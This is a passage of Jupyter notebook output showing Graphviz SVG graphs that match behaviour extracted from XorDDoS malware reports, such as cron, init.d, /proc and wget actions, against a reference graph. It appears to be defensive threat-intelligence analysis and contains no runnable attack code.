font-size=\"14.00\">31.create</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"455.8\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"455.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M403.78,-86.85C411.11,-77.19 420.44,-64.91 428.8,-54 431.42,-50.57 434.19,-46.96 436.93,-43.41\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"439.8,-45.42 443.13,-35.36 434.26,-41.14 439.8,-45.42\"/>\n<text text-anchor=\"middle\" x=\"451.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.drop</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"550.8\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"550.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M429.47,-89.37C443.67,-83.56 459.71,-76.49 473.8,-69 484.57,-63.27 486.56,-60.65 496.8,-54 504.98,-48.68 513.87,-42.91 522.03,-37.62\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"524.04,-40.49 530.53,-32.12 520.23,-34.62 524.04,-40.49\"/>\n<text text-anchor=\"middle\" x=\"515.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.use</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M465.12,-99.94C489.52,-95.2 515.14,-86.09 533.8,-69 540.33,-63.01 544.36,-54.42 546.83,-46.03\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"550.29,-46.64 549.15,-36.11 543.47,-45.05 550.29,-46.64\"/>\n<text text-anchor=\"middle\" x=\"569.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.check</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"629.8\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"629.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M462.56,-98.23C513.61,-92.97 576.87,-83.72 598.8,-69 607.61,-63.08 614.37,-53.73 619.3,-44.71\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"622.52,-46.1 623.78,-35.59 616.23,-43.02 622.52,-46.1\"/>\n<text text-anchor=\"middle\" x=\"638.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.create</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c670>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Ms.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"660pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 660.30 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 656.3,-127 656.3,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"301\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"301\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"27\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"27\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M229.17,-98.18C172.74,-92.65 99.42,-83.08 73,-69 61.41,-62.82 51.19,-52.55 43.36,-42.93\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"45.96,-40.57 37.1,-34.75 40.4,-44.82 45.96,-40.57\"/>\n<text text-anchor=\"middle\" x=\"96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">53.open</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"115\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"115\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M232.24,-96.72C192.3,-91.19 146.99,-82.24 132,-69 125.36,-63.13 121.31,-54.56 118.84,-46.17\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"122.2,-45.18 116.54,-36.22 115.38,-46.75 122.2,-45.18\"/>\n<text text-anchor=\"middle\" x=\"155\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"208\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"208\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M230.35,-97.59C212.81,-92.44 195.91,-83.69 185,-69 179.1,-61.06 181.73,-51.37 186.96,-42.64\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"189.92,-44.52 192.83,-34.33 184.2,-40.48 189.92,-44.52\"/>\n<text text-anchor=\"middle\" x=\"212.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M280.64,-87.59C273.67,-81.83 265.9,-75.24 259,-69 249.33,-60.25 238.99,-50.25 230.17,-41.51\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"232.41,-38.8 222.87,-34.2 227.47,-43.75 232.41,-38.8\"/>\n<text text-anchor=\"middle\" x=\"286.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"305\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"305\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M311.1,-87.13C313.91,-81.55 316.58,-75.19 318,-69 319.74,-61.43 318.82,-53.26 316.83,-45.76\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"320.08,-44.45 313.61,-36.07 313.44,-46.66 320.08,-44.45\"/>\n<text text-anchor=\"middle\" x=\"342\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.open</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"425\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"425\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M334.83,-88.71C346.05,-83.09 358.39,-76.29 369,-69 380.36,-61.19 391.89,-51.31 401.51,-42.39\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"403.92,-44.92 408.77,-35.5 399.11,-39.84 403.92,-44.92\"/>\n<text text-anchor=\"middle\" x=\"411\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.clone</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"539\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"539\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M357.23,-92.63C382.6,-86.77 412.71,-78.78 439,-69 462.14,-60.4 486.97,-48 506.1,-37.7\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"507.9,-40.71 515,-32.84 504.55,-34.56 507.9,-40.71\"/>\n<text text-anchor=\"middle\" x=\"496\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">52.open</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"625\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"625\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M372.73,-98.19C416.84,-93.27 474.08,-84.46 523,-69 548.97,-60.79 576.61,-46.89 596.56,-35.82\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"598.44,-38.78 605.42,-30.81 594.99,-32.68 598.44,-38.78\"/>\n<text text-anchor=\"middle\" x=\"583\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.open</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c6a0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"503pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 502.74 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 498.74,-127 498.74,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"170.95\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"170.95\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"40.95\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"40.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M140.66,-88.24C130.13,-82.49 118.35,-75.73 107.95,-69 94.41,-60.25 80.01,-49.68 68.05,-40.52\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"69.86,-37.5 59.81,-34.14 65.57,-43.03 69.86,-37.5\"/>\n<text text-anchor=\"middle\" x=\"125.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.read</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"126.95\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"126.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M162.04,-86.8C155.72,-74.58 147.12,-57.98 140.02,-44.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"143.09,-42.58 135.39,-35.31 136.88,-45.8 143.09,-42.58\"/>\n<text text-anchor=\"middle\" x=\"169.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.read</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"214.95\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"214.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M180.96,-87.05C184.23,-81.36 187.82,-74.95 190.95,-69 195.02,-61.24 199.23,-52.68 202.96,-44.87\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"206.13,-46.35 207.24,-35.82 199.8,-43.36 206.13,-46.35\"/>\n<text text-anchor=\"middle\" x=\"217.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.drop</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"302.95\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"302.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M205.22,-88.69C216.86,-83.01 229.74,-76.2 240.95,-69 254.43,-60.34 268.41,-49.27 279.67,-39.76\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"282.05,-42.33 287.35,-33.16 277.48,-37.02 282.05,-42.33\"/>\n<text text-anchor=\"middle\" x=\"277.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.read</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"337.95\" cy=\"-105\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"337.95\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"460.95\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"460.95\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c670>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M77.34,-86.8C77.34,-75.16 77.34,-59.55 77.34,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"80.84,-46.18 77.34,-36.18 73.84,-46.18 80.84,-46.18\"/>\n<text text-anchor=\"middle\" x=\"96.34\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.drop</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c6a0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Trendmicro.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M77.34,-86.8C77.34,-75.16 77.34,-59.55 77.34,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"80.84,-46.18 77.34,-36.18 73.84,-46.18 80.84,-46.18\"/>\n<text text-anchor=\"middle\" x=\"100.34\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c670>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro2.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M60.82,-87.18C56.57,-81.8 52.57,-75.54 50.34,-69 47.3,-60.09 50.29,-50.87 55.22,-42.81\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"58.14,-44.75 61.15,-34.59 52.46,-40.65 58.14,-44.75\"/>\n<text text-anchor=\"middle\" x=\"66.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.find</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M80.86,-86.98C81.87,-81.29 82.84,-74.9 83.34,-69 83.98,-61.54 83.52,-53.47 82.62,-46.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.07,-45.47 81.14,-36.09 79.15,-46.5 86.07,-45.47\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.wget</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c6a0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro2.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M77.34,-86.8C77.34,-75.16 77.34,-59.55 77.34,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"80.84,-46.18 77.34,-36.18 73.84,-46.18 80.84,-46.18\"/>\n<text text-anchor=\"middle\" x=\"95.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.wget</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c670>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Trendmicro2.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M77.34,-86.8C77.34,-75.16 77.34,-59.55 77.34,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"80.84,-46.18 77.34,-36.18 